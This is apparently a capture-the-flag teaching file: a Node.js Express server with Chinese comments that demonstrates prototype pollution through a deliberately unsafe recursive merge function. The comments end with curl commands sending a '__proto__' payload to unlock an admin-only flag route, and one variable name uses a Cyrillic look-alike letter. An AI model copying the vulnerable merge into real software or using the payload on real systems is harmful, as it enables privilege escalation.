'use strict';
// 再谈原型污染（NodeJS 漏洞案例）
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const isObject = obj => obj && obj.constructor && obj.constructor === Object; function merge(a, b) {
  for (var attr in b) {
      if (isObject(a[attr]) && isObject(b[attr])) {
          merge(a[attr], b[attr]);
      } else {
          a[attr] = b[attr];
      }
  }
  return a
}
function clone(a) {
  return merge({}, a);
}// Constants
const PORT = 8080;
const HOST = '0.0.0.0';
const admin = {};// Appconst
const app = express();
app.use(bodyParser.json())
app.use(cookieParser());

app.use('/', express.static(path.join(__dirname, 'views')));
app.post('/signup', (req, res) => {
  var body = JSON.parse(JSON.stringify(req.body));
  console.log('wukai----', body)  //{ __proto__: { admin: 1 } }
  var copybody = clone(body)
  console.log('wukai----', copybody)
  if (copybody.name) {
      res.cookie('name', copybody.name).json({
          "done": "cookie set"
      });
  } else {
      res.json({
          "error": "cookie not set"
      })
  }});
app.get('/getFlag', (req, res) => {
  var аdmin = JSON.parse(JSON.stringify(req.cookies))
  if (admin.аdmin == 1) {
      res.send("hackim19{}");
  } else {
      res.send("You are not authorized");
  }});
app.listen(PORT, HOST);
console.log(`Running on http://${HOST}:${PORT}`);

// 这段代码的漏洞就在于 merge 函数上，我们可以这样攻击：

// curl -vv --header 'Content-type: application/json' -d '{"__proto__": {"admin": 1}}' 'http://0.0.0.0:4000/signup';

// curl -vv 'http://0.0.0.0:4000/getFlag'